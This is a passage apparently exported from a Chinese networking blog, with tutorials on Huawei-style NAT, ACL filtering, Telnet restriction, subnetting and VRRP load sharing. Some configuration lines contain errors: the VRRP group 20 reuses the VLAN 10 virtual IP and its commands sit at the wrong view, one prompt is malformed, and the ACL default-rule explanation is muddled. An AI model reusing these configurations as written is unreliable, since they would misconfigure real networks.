class="line"><span class="attr">[R1-G0/0/1]ip</span> <span class="string">address 100.1.1.1 29                            //配置公网接口IP地址</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]nat</span> <span class="string">outbound 2000                                  //配置EasyIP</span></span><br></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p><strong>easy-ip</strong></p><ul><li><p>利用出口设备的出接口IP地址做NAT转换</p></li><li><p>这是目前最节约公网IP的一种NAT解决方案</p></li><li><p>easy-ip  适用于中小型企业，主机数量少的企业</p></li></ul><h2 id="NAT-Server"><a href="#NAT-Server" class="headerlink" title="NAT Server"></a>NAT Server</h2><h3 id="NAT-Server-1"><a href="#NAT-Server-1" class="headerlink" title="NAT Server"></a>NAT Server</h3><ul><li>NAT具有“屏蔽”内部主机的作用，但有时内网需要向外网提供服务，比如提供WEB服务，这种情况下需要内网的服务器不被“屏蔽”，外网用户可以随时访问内网服务器</li><li>NAT Server可以很好地解决外网主机访问内网服务器的需求</li><li>NAT Server需要提前配置好“公网IP地址+端口号”与“私网IP+端口号”的映射关系</li><li>当外网用户访问内网服务器时，将服务器的“公网IP地址+端口号”转换为对应的“私网IP地址+端口号”</li></ul><h3 id="案例需求-3"><a href="#案例需求-3" class="headerlink" title="案例需求"></a>案例需求</h3><p><strong>企业内网部署Web服务器，对外提供服务</strong></p><ul><li>允许外网主机访问企业内部服务器，使用NAT Server</li></ul><p><strong>允许企业内网主机访问外部网络，使用EasyIP或者地址池IP</strong></p><p><img src="/../img/img_artical/net_sec/5.5.7.png" alt="5.5.7"></p><h3 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h3><ul><li>外网用户通过互联网访问任何服务和应用，都是依靠“运营商”的路由设备</li><li>运营商的路由器没有私有网段的路由，只能访问公网地址才可以</li><li>企业租用公网IP地址，外部用户通过这些地址才能访问</li><li>企业网络设备必须能够实现”私有地址”和”公有地址”的转换</li><li>为了实现外网主机访问内网服务器，我们使用NAT Server</li></ul><h3 id="配置思路-4"><a href="#配置思路-4" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>配置内网服务器的IP地址和网关</li><li>配置并启用内网服务器的Web服务</li><li>在企业边界设备R1中配置接口IP地址和掩码</li><li>在企业边界设备R1中配置默认路由，下一跳指向ISP设备</li><li>在R1中创建ACL，配置允许哪些内网主机地址可以访问公网</li><li>在边界设备R1的出接口配置NAPT之EasyIP</li><li>在边界设备R1的出接口配置NAT Server</li></ul><h3 id="配置命令-4"><a href="#配置命令-4" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>R1重要配置</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 0.0.0.0 0 100.1.1.2                                        //配置默认路由</span></span><br><span class="line"><span class="attr">[R1]acl</span> <span class="string">2000                                                                   //创建acl</span></span><br><span class="line"><span class="attr">[R1-acl-2000]rule</span> <span class="string">10 permit source 192.168.1.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">G0/0/1</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]ip</span> <span class="string">address 100.1.1.1 29                                             //配置公网接口IP地址</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]nat</span> <span class="string">outbound 2000                                                   //配置EasyIP</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]nat</span> <span class="string">server protocol tcp global 100.1.1.6 80 inside 192.168.1.1 80   //配置NAT Server</span></span><br></pre></td></tr></table></figure><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p><strong>NAT Server</strong></p><ul><li><p>是一种特殊的静态NAT</p></li><li><p>主要应用于外网用户访问企业内网服务器的场景</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网实现与安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网实现与安全4</title>
      <link href="/posts/campus4.html"/>
      <url>/posts/campus4.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网实现与安全"><a href="#园区网实现与安全" class="headerlink" title="园区网实现与安全"></a>园区网实现与安全</h1><h2 id="ACL原理"><a href="#ACL原理" class="headerlink" title="ACL原理"></a>ACL原理</h2><h3 id="安全问题日益严峻"><a href="#安全问题日益严峻" class="headerlink" title="安全问题日益严峻"></a>安全问题日益严峻</h3><p><strong>随着网络的飞速发展，网络安全问题日益突出</strong></p><ul><li>企业重要服务器资源被随意访问，机密信息容易泄露，存在安全隐患</li><li>Internet病毒肆意侵略企业内网，内网环境的安全性堪忧</li><li>网络带宽被各类业务占用，导致重要的业务带宽得不到保障</li></ul><h3 id="ACL应用场景"><a href="#ACL应用场景" class="headerlink" title="ACL应用场景"></a>ACL应用场景</h3><p><strong>企业需求</strong></p><ul><li>为保证财务数据安全，禁止售后部门访问财务服务器，允许总裁办访问</li><li>禁止PC1访问财务服务器，允许PC2访问财务服务器</li></ul><p><strong>解决方案</strong></p><ul><li>配置ACL，控制数据包转发</li></ul><p><img src="/../img/img_artical/net_sec/5.4.1.png" alt="5.4.1"></p><h3 id="ACL概述"><a href="#ACL概述" class="headerlink" title="ACL概述"></a>ACL概述</h3><p><strong>ACL（Access Control List），访问控制列表</strong></p><ul><li>ACL是一个包含了多个规则的列表，不同规则通过”规则号”进行区分</li><li>每条”规则”都包含：动作 + 条件两部分内容</li><li>动作分为：允许（permit）和 拒绝（deny）</li><li>条件分为：地址和端口等···</li><li>主要用于在网络中的众多数据报文中，”抓取”感兴趣的数据</li><li>ACL本质上是一种报文过滤器，可以根据规则对报文进行过滤，按照规则的动作选择允许报文通过和阻止报文通过</li><li>ACL的作用是对数据报文进行访问控制，提高网络安全性</li></ul><h3 id="ACL作用"><a href="#ACL作用" class="headerlink" title="ACL作用"></a>ACL作用</h3><ul><li><p>对网络中数据报文进行过滤，做访问控制，</p></li><li><p>提高内网安全性， 提高带宽利用率</p></li></ul><h3 id="ACL命令解析"><a href="#ACL命令解析" class="headerlink" title="ACL命令解析"></a>ACL命令解析</h3><p><strong>ACL配置命令举例</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]acl</span> <span class="string">2000</span></span><br><span class="line"><span class="attr">[R1-acl-2000]rule</span> <span class="string">10 permit source 192.168.1.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>ACL命令解析</strong></p><ul><li>2000：表示的是”ACL的名字”，可以通过ID表示，也可以通过字符表示</li><li>rule：表示的是”规则”</li><li>10：表示的是”规则号”，取值范围是0-4294967294</li><li>permit：表示的是动作 - 允许；（deny表示的是动作 - 拒绝）</li><li>source：表示当前的”规则”检查的是数据包中的源地址</li><li>192.168.1.0：表示的是源IP地址段</li><li>0.0.0.255：表示的是与源IP地址段对应的通配符掩码</li></ul><h3 id="ACL类型"><a href="#ACL类型" class="headerlink" title="ACL类型"></a>ACL类型</h3><p><strong>基本ACL</strong></p><ul><li>只能匹配”源IP地址”</li><li>匹配数据不精准</li><li>ACL的ID取值范围是：2000 - 2999</li></ul><p><strong>高级ACL</strong></p><ul><li>可以匹配：源和目的IP地址、源和目的端口号、协议号等</li><li>匹配的数据更加精准</li><li>ACL的ID取值范围是：3000 - 3999</li></ul><h3 id="ACL组成"><a href="#ACL组成" class="headerlink" title="ACL组成"></a>ACL组成</h3><p>**ACL编号：用于标识ACL **</p><ul><li>基本：2000-2999</li><li>高级：3000-3999</li></ul><p><strong>规则：即描述报文匹配条件的判断语句</strong></p><ul><li>规则编号：用于标识规则，范围： 0～4294967294，规则号越小越好， 规则号可以手动指定，也可以根据步长值自动分配</li><li>动作：包括permit &#x2F; deny两种动作，表示允许 &#x2F; 拒绝</li><li>匹配项：地址、端口、通配符····</li></ul><p><strong>IP地址通配符也是有0和1组成的</strong></p><ul><li>“0”表示”检查相应的位”，”1”表示”不检查相应的位”</li><li>总结：检查0，忽略1</li></ul><h3 id="ACL配置机制"><a href="#ACL配置机制" class="headerlink" title="ACL配置机制"></a>ACL配置机制</h3><p><strong>ACL配置顺序</strong></p><ul><li>根据ACL规则编号从小到大匹配（编号越小越优先被匹配）</li></ul><p><strong>ACL匹配机制</strong></p><ul><li><p>匹配即停止</p></li><li><p>如果没有匹配到第一条规则，向下查找第二条规则，如果匹配，则按照第二条规则的动作去执行</p></li><li><p>如果所有规则都无法匹配，则执行隐含规则</p><p>允许所有：只要使用traffic-filter调用ACL规则时默认规则是允许所有</p><p>拒绝所有：只要不使用traffic-filter调用ACL就是拒绝所有</p></li></ul><p><img src="/../img/img_artical/net_sec/5.4.2.png" alt="5.4.2"></p><h2 id="基本ACL配置"><a href="#基本ACL配置" class="headerlink" title="基本ACL配置"></a>基本ACL配置</h2><h3 id="配置思路"><a href="#配置思路" class="headerlink" title="配置思路"></a>配置思路</h3><p><strong>企业需求：禁止PC1访问财务服务器，允许PC2访问</strong></p><p><img src="/../img/img_artical/net_sec/5.4.3.png" alt="5.4.3"></p><h3 id="基本ACL配置命令"><a href="#基本ACL配置命令" class="headerlink" title="基本ACL配置命令"></a>基本ACL配置命令</h3><p><strong>配置ACL</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]acl</span> <span class="string">2000                                                 //创建acl2000</span></span><br><span class="line"><span class="attr">[R1-acl-2000]rule</span> <span class="string">10 deny source 192.168.1.0 0.0.0.255       //配置acl规则</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R1-g0/0/0]traffic-filter</span> <span class="string">outbound acl 2000                  //在接口上调用acl2000</span></span><br></pre></td></tr></table></figure><h2 id="高级ACL配置"><a href="#高级ACL配置" class="headerlink" title="高级ACL配置"></a>高级ACL配置</h2><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>实验需求</strong></p><ul><li>售后部仅仅能访问Server1上的Web服务，不能访问其他服务</li><li>售后部可以访问行政部的所有设备的任何服务</li><li>除了上述权限外，售后部不能访问网络中的其他任何主机</li></ul><p><img src="/../img/img_artical/net_sec/5.4.4.png" alt="5.4.4"></p><h3 id="高级ACL配置命令"><a href="#高级ACL配置命令" class="headerlink" title="高级ACL配置命令"></a>高级ACL配置命令</h3><p><strong>配置ACL</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]acl</span> <span class="string">3000                                                                                                 //创建acl3000</span></span><br><span class="line"><span class="attr">[R1-acl-3000]rule</span> <span class="string">10 permit tcp source 192.168.1.1 0 destination 192.168.3.1 0 destination-port eq 80        //配置acl规则</span></span><br><span class="line"><span class="attr">[R1-acl-3000]rule</span> <span class="string">20 permit ip source 192.168.1.1 0 destination 192.168.2.0 0.0.0.255                        //配置acl规则</span></span><br><span class="line"><span class="attr">[R1-acl-3000]rule</span> <span class="string">30 deny ip source 192.168.1.1 0 destination any                                            //配置acl规则</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">g0/0/2</span></span><br><span class="line"><span class="attr">[R1-g0/0/2]traffic-filter</span> <span class="string">outbound acl 3000                                                                  //在接口上调用acl3000</span></span><br></pre></td></tr></table></figure><h2 id="高级ACL之ICMP"><a href="#高级ACL之ICMP" class="headerlink" title="高级ACL之ICMP"></a>高级ACL之ICMP</h2><h3 id="实验需求-1"><a href="#实验需求-1" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>实验需求</strong></p><ul><li>售后部主机仅仅能 ping通Server1，不能访问Server1其他服务</li><li>售后部主机可以访问行政部的所有设备的任何服务</li><li>除了上述权限外，售后部不能访问网络中的其他任何主机</li></ul><p><img src="/../img/img_artical/net_sec/5.4.5.png" alt="5.4.5"></p><h3 id="高级ACL配置命令-1"><a href="#高级ACL配置命令-1" class="headerlink" title="高级ACL配置命令"></a>高级ACL配置命令</h3><p><strong>配置ACL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R1]acl 3000                                                                           //创建acl3000</span><br><span class="line">[R1-acl-3000]rule 10 permit icmp source 192.168.1.1 0 destination 192.168.3.1 0        //配置acl规则</span><br><span class="line">[R1-acl-3000]rule 20 permit ip source 192.168.1.1 0 destination 192.168.2.0 0.0.0.255  //配置acl规则</span><br><span class="line">[R1-acl-3000]rule 30 deny ip source 192.168.1.1 0 destination any                      //配置acl规则</span><br><span class="line">[R1]interface g0/0/2</span><br><span class="line">[R1-g0/0/2]traffic-filter outbound acl 3000                                            //在接口上调用acl3000</span><br></pre></td></tr></table></figure><h2 id="基本ACL之Telnet"><a href="#基本ACL之Telnet" class="headerlink" title="基本ACL之Telnet"></a>基本ACL之Telnet</h2><h3 id="实验需求-2"><a href="#实验需求-2" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>实验需求</strong></p><ul><li>为了便于设备管理，为设备开启远程管理功能，登录密码:NTD</li><li>仅仅允许R1的192.168.1.254 远程登录R2，其他设备不可以</li><li>拒绝R1的任何IP地址远程登录 R3，其他设备都可以</li></ul><p><img src="/../img/img_artical/net_sec/5.4.6.png" alt="5.4.6"></p><h3 id="配置远程访问功能"><a href="#配置远程访问功能" class="headerlink" title="配置远程访问功能"></a>配置远程访问功能</h3><p><strong>配置远程访问</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]user-interface</span> <span class="string">vty 0 4</span></span><br><span class="line"><span class="attr">[R2-ui-vty0-4]authentication-mode</span> <span class="string">password</span></span><br><span class="line"><span class="attr">please</span> <span class="string">configure the login password (maximum length 16):NTD</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R3]user-interface</span> <span class="string">vty 0 4</span></span><br><span class="line"><span class="attr">[R3]authentication-mode</span> <span class="string">password</span></span><br><span class="line"><span class="attr">please</span> <span class="string">configure the login password (maximum length 16):NTD</span></span><br></pre></td></tr></table></figure><h3 id="基本ACL配置命令-1"><a href="#基本ACL配置命令-1" class="headerlink" title="基本ACL配置命令"></a>基本ACL配置命令</h3><p><strong>配置ACL</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]acl</span> <span class="string">2000                                          //创建acl2000</span></span><br><span class="line"><span class="attr">[R2-acl-2000]rule</span> <span class="string">10 permit source 192.168.1.254 0    //配置acl规则</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]user-interface</span> <span class="string">vty 0 4</span></span><br><span class="line"><span class="attr">[R2-ui-vty0-4]acl</span> <span class="string">2000 inbound                        //在接口上调用acl2000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R3]acl</span> <span class="string">2000                                          //创建acl2000</span></span><br><span class="line"><span class="attr">[R3-acl-2000]rule</span> <span class="string">10 deny source 192.168.1.254 0      //配置acl规则</span></span><br><span class="line"><span class="attr">[R3-acl-2000]rule</span> <span class="string">20 deny source 192.168.12.1 0       //配置acl规则</span></span><br><span class="line"><span class="attr">[R3-acl-2000]rule</span> <span class="string">30 permit source any                //配置acl规则</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R3]user-interface</span> <span class="string">vty 0 4</span></span><br><span class="line"><span class="attr">[R3-ui-vty0-4]acl</span> <span class="string">2000 inbound                        //在接口上调用acl2000</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网实现与安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网实现与安全3</title>
      <link href="/posts/campus3.html"/>
      <url>/posts/campus3.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网实现与安全"><a href="#园区网实现与安全" class="headerlink" title="园区网实现与安全"></a>园区网实现与安全</h1><h2 id="子网划分概述"><a href="#子网划分概述" class="headerlink" title="子网划分概述"></a>子网划分概述</h2><h3 id="子网划分的原因"><a href="#子网划分的原因" class="headerlink" title="子网划分的原因"></a>子网划分的原因</h3><ul><li><p>节省IP地址，减少IP地址的浪费</p></li><li><p>满足不同网络对IP地址的需求</p></li><li><p>实现网络设备编址的层次化需求</p></li></ul><p><img src="/../img/img_artical/net_sec/5.3.1.png" alt="5.3.1"></p><h3 id="子网划分的理解"><a href="#子网划分的理解" class="headerlink" title="子网划分的理解"></a>子网划分的理解</h3><p><img src="/../img/img_artical/net_sec/5.3.2.png" alt="5.3.2"></p><h3 id="子网划分概述-1"><a href="#子网划分概述-1" class="headerlink" title="子网划分概述"></a>子网划分概述</h3><p><strong>子网划分是什么</strong></p><ul><li>子网划分指将一个网络划分为多个更小的网络</li></ul><p><strong>如何进行子网划分</strong></p><ul><li>将主机位借给网络位（让主机位变短，让网络位变长）</li></ul><h2 id="子网划分的方法"><a href="#子网划分的方法" class="headerlink" title="子网划分的方法"></a>子网划分的方法</h2><h3 id="子网划分的理解-1"><a href="#子网划分的理解-1" class="headerlink" title="子网划分的理解"></a>子网划分的理解</h3><p><strong>将192.168.1.0&#x2F;24划分为4个小网段</strong></p><ul><li>将主机位划到网络位</li></ul><p><img src="/../img/img_artical/net_sec/5.3.3.png" alt="5.3.3"></p><p><img src="/../img/img_artical/net_sec/5.3.4.png" alt="5.3.4"></p><p><img src="/../img/img_artical/net_sec/5.3.5.png" alt="5.3.5"></p><h3 id="C类地址的划分"><a href="#C类地址的划分" class="headerlink" title="C类地址的划分"></a>C类地址的划分</h3><p><strong>IP地址经过一次子网划分后，被分成三个部分–网络位、子网位和主机位</strong></p><p><img src="/../img/img_artical/net_sec/5.3.6.png" alt="5.3.6"></p><h2 id="等长子网划分应用"><a href="#等长子网划分应用" class="headerlink" title="等长子网划分应用"></a>等长子网划分应用</h2><h3 id="子网划分实例"><a href="#子网划分实例" class="headerlink" title="子网划分实例"></a>子网划分实例</h3><p><strong>某分公司共有生产部、销售部、财务部、客服部四个部门，每个部门的主机数最多不超过50台，若该公司获得了一个C类地址192.168.100.0&#x2F;24应该如何划分子网呢？</strong></p><p><strong>解决方案：执行等长的子网划分</strong></p><ul><li><p>划分4个相同大小的子网网段</p></li><li><p>每个子网网段中的IP地址数量相同</p></li><li><p>划分结果：分配4个子网网段，掩码为26<br>192.168.100.0&#x2F;26   （第一个子网网段）<br>192.168.100.64&#x2F;26   （第二个子网网段）<br>192.168.100.128&#x2F;26  （第三个子网网段）<br>192.168.100.192&#x2F;26  （第四个子网网段）</p></li></ul><table><thead><tr><th>部门</th><th>网段</th><th>掩码</th><th>有效地址</th></tr></thead><tbody><tr><td>生产部</td><td>192.168.100.0&#x2F;26</td><td>255.255.255.192</td><td>62</td></tr><tr><td>销售部</td><td>192.168.100.64&#x2F;26</td><td>255.255.255.192</td><td>62</td></tr><tr><td>财务部</td><td>192.168.100.128&#x2F;26</td><td>255.255.255.192</td><td>62</td></tr><tr><td>客服部</td><td>192.168.100.192&#x2F;26</td><td>255.255.255.192</td><td>62</td></tr></tbody></table><h2 id="可变长子网划分方法"><a href="#可变长子网划分方法" class="headerlink" title="可变长子网划分方法"></a>可变长子网划分方法</h2><h3 id="VLSM概述"><a href="#VLSM概述" class="headerlink" title="VLSM概述"></a>VLSM概述</h3><p><strong>VLSM</strong></p><ul><li>一个进行了子网划分的网络中的不同子网网段使用不同的子网掩码，而且每个子网网段中的IP地址数量也不一致</li></ul><h2 id="可变长子网划分应用"><a href="#可变长子网划分应用" class="headerlink" title="可变长子网划分应用"></a>可变长子网划分应用</h2><h3 id="子网划分实例-1"><a href="#子网划分实例-1" class="headerlink" title="子网划分实例"></a>子网划分实例</h3><p><strong>如果销售部有主机90台，生产部有50台，客服部有26台，财务部有15台应该如何划分子网呢？</strong></p><p><strong>解决方案：执行不等长的子网划分</strong></p><ul><li><p>划分4个不同大小的子网网段</p></li><li><p>每个子网网段中的IP地址数量不同</p></li><li><p>划分结果：分配4个子网网段<br>192.168.100.0&#x2F;25  （第一个子网网段）<br>192.168.100.128&#x2F;26   （第二个子网网段）<br>192.168.100.192&#x2F;27  （第三个子网网段）<br>192.168.100.224&#x2F;27  （第四个子网网段）</p></li></ul><table><thead><tr><th>部门</th><th>网段</th><th>掩码</th><th>有效地址</th></tr></thead><tbody><tr><td>销售部</td><td>192.168.100.0&#x2F;25</td><td>255.255.255.128</td><td>126</td></tr><tr><td>生产部</td><td>192.168.100.128&#x2F;26</td><td>255.255.255.192</td><td>62</td></tr><tr><td>客服部</td><td>192.168.100.192&#x2F;27</td><td>255.255.255.224</td><td>30</td></tr><tr><td>财务部</td><td>192.168.100.224&#x2F;27</td><td>255.255.255.224</td><td>30</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网实现与安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网实现与安全2</title>
      <link href="/posts/campus2.html"/>
      <url>/posts/campus2.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网实现与安全"><a href="#园区网实现与安全" class="headerlink" title="园区网实现与安全"></a>园区网实现与安全</h1><h2 id="多VLAN网关负载分担"><a href="#多VLAN网关负载分担" class="headerlink" title="多VLAN网关负载分担"></a>多VLAN网关负载分担</h2><h3 id="多VLAN网关负载分担-1"><a href="#多VLAN网关负载分担-1" class="headerlink" title="多VLAN网关负载分担"></a>多VLAN网关负载分担</h3><p><strong>多VLAN网关负载分担</strong></p><ul><li>创建多个备份组，每个备份组都有一台虚拟路由器</li><li>每个物理路由器在不同的VRRP组中扮演不同的角色</li><li>不同的虚拟路由器的Virtual IP作为不同的内网网关地址，实现流量转发负载分担</li></ul><h3 id="多VLAN网关负载分担实验"><a href="#多VLAN网关负载分担实验" class="headerlink" title="多VLAN网关负载分担实验"></a>多VLAN网关负载分担实验</h3><p><strong>拓扑</strong></p><p><img src="/../img/img_artical/net_sec/5.2.1.png" alt="5.2.1"></p><p><strong>需求：实现网关冗余，VLAN流量的负载均衡</strong></p><p><strong>SW1是备份组10的主网关</strong></p><p><strong>SW2是备份组20的主网关</strong></p><p><strong>步骤：</strong></p><ul><li><p>第一步：配置PC的IP地址，子网掩码，网关</p></li><li><p>第二步：交换机配置VLAN，接口加入指定VLAN</p><ul><li><p>SW3交换机创建VLAN10、VLAN20</p></li><li><p>SW3交换机与PC连接的接口都设置为Access模式，并分别加入VLAN10、VLAN20</p></li><li><p>SW3交换机与SW1、SW2连接的接口设置为Trunk模式</p></li><li><p>SW1、SW2与SW1连接的接口设置为Trunk模式</p></li></ul></li><li><p>第三步：交换机配置VLAN接口IP地址</p></li><li><p>第四步：交换机配置浮动路由</p><ul><li>配置备份组10、备份组20</li></ul></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">配置命令：</span></span><br><span class="line"><span class="attr">第一步：配置PC的IP地址，子网掩码，网关</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步：交换机配置VLAN，接口加入指定VLAN</span></span><br><span class="line"><span class="attr">1）SW3交换机创建VLAN10、VLAN20</span></span><br><span class="line"><span class="attr">2）SW3交换机与PC连接的接口都设置为Access模式，并分别加入VLAN10、VLAN20</span></span><br><span class="line"><span class="attr">3）SW3交换机与SW1、SW2连接的接口设置为Trunk模式</span></span><br><span class="line"><span class="attr">4）SW1、SW2与SW1连接的接口设置为Trunk模式</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW3]vlan</span> <span class="string">batch 10 20</span></span><br><span class="line"><span class="attr">[SW3]interface</span> <span class="string">gigabitethernet0/0/0</span></span><br><span class="line"><span class="attr">[SW3-gigabitethernet0/0/0]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW3-gigabitethernet0/0/0]port</span> <span class="string">default vlan 10</span></span><br><span class="line"><span class="attr">[SW3-gigabitethernet0/0/0]interface</span> <span class="string">gigabitethernet0/0/1</span></span><br><span class="line"><span class="attr">[SW3-gigabitethernet0/0/1]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW3-gigabitethernet0/0/1]port</span> <span class="string">default vlan 20</span></span><br><span class="line"><span class="attr">[SW3-gigabitethernet0/0/1]port-group</span> <span class="string">group-member g0/0/2 g0/0/3</span></span><br><span class="line"><span class="attr">[SW3-port-group]port</span> <span class="string">link-type trunk</span></span><br><span class="line"><span class="attr">[SW3-port-group]port</span> <span class="string">trunk allow-all vlan all</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW1]vlan</span> <span class="string">batch 10 20</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">gigabitethernet0/0/0</span></span><br><span class="line"><span class="attr">[SW1-gigabitethernet0/0/0]port</span> <span class="string">link-type trunk</span></span><br><span class="line"><span class="attr">[SW1-gigabitethernet0/0/0]port</span> <span class="string">trunk allow-all vlan all</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW2]vlan</span> <span class="string">batch 10 20</span></span><br><span class="line"><span class="attr">[SW2]interface</span> <span class="string">gigabitethernet0/0/0</span></span><br><span class="line"><span class="attr">[SW2-gigabitethernet0/0/0]port</span> <span class="string">link-type trunk</span></span><br><span class="line"><span class="attr">[SW2-gigabitethernet0/0/0]port</span> <span class="string">trunk allow-all vlan all</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步：交换机配置VLAN接口IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">vlanif 10</span></span><br><span class="line"><span class="attr">[SW1-VlanIf10]ip</span> <span class="string">address 192.168.10.251 24</span></span><br><span class="line"><span class="attr">[SW1-VlanIf10]interface</span> <span class="string">vlanif 20</span></span><br><span class="line"><span class="attr">[SW1-VlanIf20]ip</span> <span class="string">address 192.168.20.251 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW2]interface</span> <span class="string">vlanif 10</span></span><br><span class="line"><span class="attr">[SW2-VlanIf10]ip</span> <span class="string">address 192.168.10.252 24</span></span><br><span class="line"><span class="attr">[SW2-VlanIf10]interface</span> <span class="string">vlanif 20</span></span><br><span class="line"><span class="attr">[SW2-VlanIf20]ip</span> <span class="string">address 192.168.20.252 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第四步：交换机配置浮动路由</span></span><br><span class="line"><span class="attr">1）配置备份组10、备份组20</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW1]vrrp</span> <span class="string">vrid 10 virtual-ip 192.168.10.254</span></span><br><span class="line"><span class="attr">[SW1]vrrp</span> <span class="string">vrid 10 priority 130</span></span><br><span class="line"><span class="attr">[SW1]vrrp</span> <span class="string">vrid 20 virtual-ip 192.168.10.254</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW2]vrrp</span> <span class="string">vrid 10 virtual-ip 192.168.10.254</span></span><br><span class="line"><span class="attr">[SW2]vrrp</span> <span class="string">vrid 20 virtual-ip 192.168.10.254</span></span><br><span class="line"><span class="attr">[SW2]vrrp</span> <span class="string">vrid 20 priority 130</span></span><br></pre></td></tr></table></figure><h2 id="BFD原理"><a href="#BFD原理" class="headerlink" title="BFD原理"></a>BFD原理</h2><h3 id="现网中存在的问题"><a href="#现网中存在的问题" class="headerlink" 